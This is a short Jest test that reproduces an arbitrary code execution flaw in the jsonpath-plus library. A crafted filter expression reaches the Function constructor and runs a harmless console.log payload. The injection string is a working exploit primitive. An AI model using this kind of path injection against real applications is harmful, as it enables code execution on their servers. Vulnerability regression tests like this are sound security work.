test("Arbitrary code execution in jsonpath-plus", (done) => {
  const { JSONPath } = require("jsonpath-plus");

  console.log = jest.fn();

  const exampleObj = { example: true }
  const userControlledPath = "$..[?(p=\"console.log('EXPLOITED')\";a=''[['constructor']][['constructor']](p);a())]";

  JSONPath({ json: exampleObj, path: userControlledPath });

  expect(console.log).toHaveBeenCalledWith('EXPLOITED');
  done();
});
